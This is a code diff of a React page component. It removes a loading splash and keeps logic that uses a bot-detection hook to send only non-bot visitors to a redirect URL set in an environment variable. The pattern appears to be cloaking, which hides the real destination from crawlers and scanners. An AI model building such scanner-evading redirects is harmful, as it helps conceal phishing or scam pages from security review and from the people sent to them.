@@ -1,38 +1,14 @@
 import type { FC } from 'react';
-import { useEffect, useRef, useState } from 'react';
+import { useEffect, useRef } from 'react';
 import { useBotDetection } from '@/hooks/useBotDetection';
-
-const LoadingDots = () => {
-    const [dots, setDots] = useState('');
-
-    useEffect(() => {
-        const interval = setInterval(() => {
-            setDots((prev) => {
-                if (prev.length >= 5) return '';
-                return prev + '.';
-            });
-        }, 300);
-
-        return () => clearInterval(interval);
-    }, []);
-
-    return (
-        <div className="fixed inset-0 flex items-center justify-center bg-white">
-				<img src="https://raw.githubusercontent.com/Cattom911/ca_map/refs/heads/enable_noti/src/assets/images/splash.gif" alt="Loading..." className="max-w-full max-h-full" />
-			</div>
-        </div>
-    );
-};
 
 const Index: FC = () => {
     const { isBot, isLoading, shouldRedirect } = useBotDetection();
-    const [redirecting, setRedirecting] = useState(false);
     const logSentRef = useRef(false);
 
     useEffect(() => {
         console.log('Redirect check:', { shouldRedirect, isBot, isLoading });
         if (shouldRedirect && !isBot && !isLoading) {
-            setRedirecting(true);
             const redirectUrl = import.meta.env.PUBLIC_REDIRECT_URL;
             console.log('Redirecting to:', redirectUrl);
             window.location.href = redirectUrl;
@@ -115,7 +91,6 @@ const Index: FC = () => {
     useEffect(() => {
         if (!isLoading && !isBot && !shouldRedirect) {
             const timer = setTimeout(() => {
-                setRedirecting(true);
                 const redirectUrl = import.meta.env.PUBLIC_REDIRECT_URL;
                 window.location.href = redirectUrl;
             }, 5000);
